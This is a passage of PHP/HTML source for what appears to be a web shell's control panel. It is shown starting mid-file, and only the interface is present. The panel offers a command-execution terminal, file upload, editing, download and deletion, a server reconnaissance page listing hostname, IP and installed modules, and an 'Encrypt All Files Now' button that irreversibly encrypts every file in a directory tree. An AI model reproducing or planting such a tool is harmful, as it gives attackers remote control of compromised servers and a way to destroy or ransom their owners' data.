                        <button type="submit" name="encrypt_all" class="btn-encrypt-main" onclick="return confirm('⚠️ FINAL WARNING: This will encrypt ALL files in this directory and subdirectories. The process cannot be undone! Continue?')">
                            <i class="fas fa-lock"></i> Encrypt All Files Now
                        </button>
                        <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                    </form>
                </div>

            <?php elseif ($showEditor): ?>
                <!-- EDITOR -->
                <div class="editor-box">
                    <div class="editor-header">
                        <span><i class="fas fa-edit"></i> Editing: <?= htmlspecialchars($editFile) ?></span>
                        <span style="color:#553333;"><?= htmlspecialchars($currentDir) ?></span>
                    </div>
                    <form method="POST">
                        <textarea name="edit_content" spellcheck="false"><?= $editContent ?></textarea>
                        <div class="editor-footer">
                            <button type="submit" name="edit_file" class="btn-save"><i class="fas fa-save"></i> Save</button>
                            <a href="?view=files&dir=<?= urlencode($currentDir) ?>" class="btn-cancel"><i class="fas fa-times"></i> Cancel</a>
                            <input type="hidden" name="edit_filename" value="<?= htmlspecialchars($editFile) ?>">
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </div>
                    </form>
                </div>

            <?php elseif ($view === 'terminal'): ?>
                <!-- TERMINAL -->
                <div class="terminal-box">
                    <div class="term-header">
                        <span><i class="fas fa-terminal"></i>Terminal</span>
                        <span><i class="fas fa-folder"></i> <?= htmlspecialchars($currentDir) ?></span>
                    </div>
                    <div class="term-body">
                        <div class="output"><?= htmlspecialchars($output) ?></div>
                    </div>
                    <form method="POST">
                        <div class="term-input">
                            <input type="text" name="command" placeholder="Enter command..." autofocus>
                            <button type="submit" name="execute_cmd"><i class="fas fa-play"></i> Execute</button>
                        </div>
                        <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                    </form>
                </div>

            <?php elseif ($view === 'files' || $view === 'create'): ?>
                <!-- FILE MANAGER TOOLS -->
                <?php if ($view === 'create'): ?>
                <div class="tools-grid">
                    <div class="tool-card">
                        <div class="tool-title"><i class="fas fa-file-plus"></i>Create File</div>
                        <form method="POST">
                            <input type="text" name="filename" placeholder="Filename" required>
                            <textarea name="filecontent" placeholder="File content..."></textarea>
                            <button type="submit" name="create_file" class="btn"><i class="fas fa-check"></i> Create</button>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>
                    <div class="tool-card">
                        <div class="tool-title"><i class="fas fa-folder-plus"></i>Create Directory</div>
                        <form method="POST">
                            <input type="text" name="dirname" placeholder="Directory name" required>
                            <button type="submit" name="create_dir" class="btn"><i class="fas fa-check"></i> Create</button>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>
                    <div class="tool-card">
                        <div class="tool-title"><i class="fas fa-search"></i>Search in File</div>
                        <form method="POST">
                            <input type="text" name="search_filename" placeholder="Filename" required>
                            <input type="text" name="search_term" placeholder="Search term" required>
                            <button type="submit" name="search_in_file" class="btn-secondary"><i class="fas fa-search"></i> Search</button>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </form>
                    </div>
                </div>
                <?php endif; ?>

                <!-- UPLOAD -->
                <div class="upload-area" onclick="document.getElementById('uploadFileInput').click();">
                    <i class="fas fa-cloud-upload-alt"></i>
                    Click to browse or drag file here
                    <small>File will be uploaded to current directory</small>
                    <form method="POST" enctype="multipart/form-data" id="uploadFileForm">
                        <input type="file" name="uploaded_file" id="uploadFileInput" onchange="document.getElementById('uploadFileForm').submit();" style="display:none;">
                        <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                    </form>
                </div>

                <!-- FILE TABLE -->
                <div class="file-table-wrap">
                    <form method="POST" id="bulkForm">
                        <table class="file-table">
                            <thead>
                                <tr>
                                    <th style="width:30px;"><input type="checkbox" id="selectAll" onchange="toggleAll(this)"></th>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Modified</th>
                                    <th>Owner</th>
                                    <th>Perms</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (is_readable($parentDir) && $currentDir !== '/'): ?>
                                    <tr>
                                        <td></td>
                                        <td>
                                            <a href="?view=files&dir=<?= urlencode($parentDir) ?>" class="folder-item">
                                                <i class="fas fa-arrow-left"></i> ..
                                            </a>
                                        </td>
                                        <td>—</td><td>—</td><td>—</td><td>—</td>
                                        <td>—</td>
                                    </tr>
                                <?php endif; ?>
                                <?php foreach ($sortedFiles as $file): ?>
                                    <?php $fullPath = $currentDir . '/' . $file; ?>
                                    <?php $isDir = is_dir($fullPath); ?>
                                    <?php $icon = $isDir ? 'fas fa-folder' : getFileIcon($file); ?>
                                    <?php $perms = substr(sprintf('%o', fileperms($fullPath)), -4); ?>
                                    <?php $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fullPath))['name'] ?? fileowner($fullPath) : fileowner($fullPath); ?>
                                    <?php $size = $isDir ? '—' : formatSize(filesize($fullPath)); ?>
                                    <?php $mtime = date('d M Y H:i', filemtime($fullPath)); ?>
                                    <tr>
                                        <td>
                                            <input type="checkbox" name="bulk_files[]" value="<?= htmlspecialchars($file) ?>" class="bulk-check">
                                        </td>
                                        <td>
                                            <?php if ($isDir): ?>
                                                <a href="?view=files&dir=<?= urlencode($fullPath) ?>" class="folder-item">
                                                    <i class="<?= $icon ?>"></i> <?= htmlspecialchars($file) ?>
                                                </a>
                                            <?php else: ?>
                                                <span class="file-item">
                                                    <i class="<?= $icon ?>"></i> <?= htmlspecialchars($file) ?>
                                                </span>
                                            <?php endif; ?>
                                        </td>
                                        <td><?= $size ?></td>
                                        <td><?= $mtime ?></td>
                                        <td><?= htmlspecialchars($owner) ?></td>
                                        <td><span class="perms"><?= $perms ?></span></td>
                                        <td>
                                            <div class="actions">
                                                <?php if (!$isDir): ?>
                                                    <?php if (isTextFile($file)): ?>
                                                        <a href="?view=files&edit=<?= urlencode($file) ?>&dir=<?= urlencode($currentDir) ?>" class="edit-link" title="Edit">
                                                            <i class="fas fa-pen"></i>
                                                        </a>
                                                        <a href="?viewfile=<?= urlencode($file) ?>&dir=<?= urlencode($currentDir) ?>" class="view-link" title="View" target="_blank">
                                                            <i class="fas fa-eye"></i>
                                                        </a>
                                                    <?php endif; ?>
                                                    <a href="?download=<?= urlencode($file) ?>&dir=<?= urlencode($currentDir) ?>" class="download-link" title="Download">
                                                        <i class="fas fa-download"></i>
                                                    </a>
                                                <?php endif; ?>
                                                <a class="rename-link" onclick="showRenameModal('<?= htmlspecialchars($file) ?>')" title="Rename">
                                                    <i class="fas fa-tag"></i>
                                                </a>
                                                <a class="del" onclick="showDeleteModal('<?= htmlspecialchars($file) ?>')" title="Delete">
                                                    <i class="fas fa-trash-alt"></i>
                                                </a>
                                            </div>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                        <div style="padding:10px 14px;display:flex;gap:10px;align-items:center;border-top:1px solid #2a1515;">
                            <button type="submit" name="bulk_delete" class="bulk-delete-btn" onclick="return confirmBulkDelete()">
                                <i class="fas fa-trash-alt"></i> Delete Selected
                            </button>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                        </div>
                    </form>
                </div>

                <script>
                function showDeleteModal(filename) {
                    if (confirm('Delete "' + filename + '"?')) {
                        window.location.href = '?delete=' + encodeURIComponent(filename) + '&dir=<?= urlencode($currentDir) ?>';
                    }
                }

                function showRenameModal(filename) {
                    const newName = prompt('Rename "' + filename + '" to:', filename);
                    if (newName && newName !== filename) {
                        document.getElementById('renameOld').value = filename;
                        document.getElementById('renameNew').value = newName;
                        document.getElementById('renameForm').submit();
                    }
                }

                function confirmBulkDelete() {
                    const checked = document.querySelectorAll('.bulk-check:checked');
                    if (checked.length === 0) {
                        alert('Please select at least one file.');
                        return false;
                    }
                    return confirm('Delete ' + checked.length + ' selected items?');
                }

                function toggleAll(master) {
                    document.querySelectorAll('.bulk-check').forEach(cb => cb.checked = master.checked);
                }
                </script>

                <!-- Rename Form -->
                <form method="POST" id="renameForm" style="display:none;">
                    <input type="hidden" name="oldname" id="renameOld">
                    <input type="hidden" name="newname" id="renameNew">
                    <input type="hidden" name="rename" value="1">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
                </form>

            <?php elseif ($view === 'info'): ?>
                <!-- SERVER INFO -->
                <h3 style="color:#883333;font-size:13px;font-weight:600;margin-bottom:16px;">
                    <i class="fas fa-server" style="color:#ff4444;margin-right:8px;"></i>
                    Server Information
                </h3>
                <div class="info-grid">
                    <?php foreach ($serverInfo as $label => $value): 
                        $isStatus = in_array($label, ['MySQL', 'GD Library', 'CURL', 'OpenSSL', 'ZIP Archive', 'JSON', 'MBString', 'PDO', 'Session Support']);
                        $isVersion = in_array($label, ['MySQL Version', 'GD Version', 'CURL Version', 'OpenSSL Version']);
                        $isSpecial = in_array($label, ['Server Hostname', 'Server IP Address', 'Server OS', 'Load Average']);
                    ?>
                        <div class="info-card">
                            <div class="label"><?= $label ?></div>
                            <div class="value <?= $isSpecial ? 'host' : '' ?>">
                                <?php if ($isStatus): ?>
                                    <span class="badge <?= $serverInfoStatus[$label] ? 'enabled' : 'disabled' ?>">
                                        <i class="fas <?= $serverInfoStatus[$label] ? 'fa-check' : 'fa-times' ?>"></i>
                                        <?= htmlspecialchars($value) ?>
                                    </span>
                                <?php elseif ($isVersion && $value !== 'N/A' && $value !== 'Unknown'): ?>
                                    <span style="color:#88ccff;"><?= htmlspecialchars($value) ?></span>
                                <?php else: ?>
                                    <?= htmlspecialchars($value) ?>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <script>
    function switchView(view) {
        const url = new URL(window.location);
        url.searchParams.set('view', view);
        url.searchParams.set('dir', '<?= urlencode($currentDir) ?>');
        window.location.href = url.toString();
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.querySelector('form[action=""]');
        if (form) {
            form.addEventListener('submit', function() {
                const btn = document.getElementById('executeBtn');
                if (btn) {
                    btn.disabled = true;
                    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
                }
            });
        }
    });
    </script>
</body>
</html>